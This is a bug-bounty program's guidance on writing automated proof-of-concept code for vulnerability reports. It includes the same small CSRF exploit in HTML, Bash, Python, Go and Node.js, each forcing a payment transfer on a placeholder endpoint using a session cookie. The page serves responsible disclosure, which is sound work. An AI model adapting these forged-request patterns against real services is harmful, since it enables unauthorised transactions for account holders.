Create an exceptional automated PoC
Including a great proof of concept (PoC) in your VRP report makes the vulnerability you've discovered unambiguously clear and effortless to reproduce, thus hastening the processing of your report and the decision on a potential reward.

The following sections provide additional guidance for automated PoCs submitted to the Abuse, Cloud, and Google VRPs in order to help you fulfill the bar for exceptional quality reports (see e.g. report quality guidance for the Google VRP).

Traits we like to see in automated PoCs 
Can run in a Debian-based Linux environment like Google Cloud Shell. We will run your PoC in a sandboxed environment.
Minimal and self contained, avoiding dependencies outside core libraries when possible. For example, use the Python Requests library instead of less common HTTP libraries. We may ask you to rewrite your PoC if we cannot quickly and confidently verify the safety of the dependency(s) used.
Documented sufficiently for us to be able to understand what is being run and for what purpose to prove impact. This documentation can be inline or in your report.
Extra points for including a short video (unlisted on YouTube or hosted privately) demonstrating how your PoC should be run and the expected output 📽️
Allows us to use our own cookies/credentials etc. easily. We always use our own test accounts and cannot use yours.
What we are NOT looking for 
Selenium or other browser-based automation. We are interested in the underlying API calls that caused a vulnerability. Additionally, browser-based automation presents a complex reproduction environment that can be complicated to share, especially with credentials involved.
Less common or lower level programming languages. Try to keep it simple (HTML, Bash, Python, Golang, Node.js). Leave your COBOL expertise out of your report 🙂
Automation for exploits which require complex browser interaction. If an automated PoC won’t be useful, don't include it and describe why. A good example is DOM-based XSS where you need the browser to run JavaScript to trigger your exploit.
Added complexity unnecessary for proving impact. Automation to set up the needed environment is helpful, however, adding multiple exploits to one PoC to prove the same vulnerability is not necessary.
Acceptable Languages & Examples 
Note that other languages are welcome, but please try to keep your PoC simple.

HTML 
An example POC for a POST-based CSRF on paymentexample.google.com could be as simple as:

<form action="https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true" method="POST" id="form">
</form>
<script>document.getElementById('form').submit()</script>
Bash 
A similar PoC, but written in Bash:

LOGIN_TOKEN="LOGIN_TOKEN"

curl "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"
-X POST -H "Cookie: session=${LOGIN_TOKEN}"
Python 
A similar PoC, but written in Python:

import requests

login_token ="LOGIN_TOKEN"
url = "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"
headers = {"Cookie": f"session={login_token}"}

response = requests.post(url, headers=headers)
print(response.text)
Golang 
A similar PoC, but written in Golang (error handling omitted):

package main

import (
    "fmt"
    "io"
    "net/http"
)

func main() {
    login_token := "LOGIN_TOKEN"
    url := "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true"

    // setup the request
    req, _ := http.NewRequest(http.MethodPost, url, nil)

    // setup cookies
    cookieValue := fmt.Sprintf("session=%s", login_token)
    req.Header.Set("Cookie", cookieValue)

    // create HTTP client
    client := &http.Client{}
    resp, _ := client.Do(req)

    // print the response
    body, _ := io.ReadAll(resp.Body)
    fmt.Println("Response Body:", string(body))
}
Node.js 
A similar PoC, but written in Node.js:

const loginToken = "LOGIN_TOKEN";
const url = "https://paymentexample.google.com/send?amount=1337&from=thomas&to=eve&do=true";

const headers = {
    "Cookie": `session=${loginToken}`
};

async function makeRequest() {
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: headers
        });
        const responseText = await response.text();
        console.log(responseText);

    } catch (error) {
        console.error("Request error:", error);
    }
}

makeRequest();
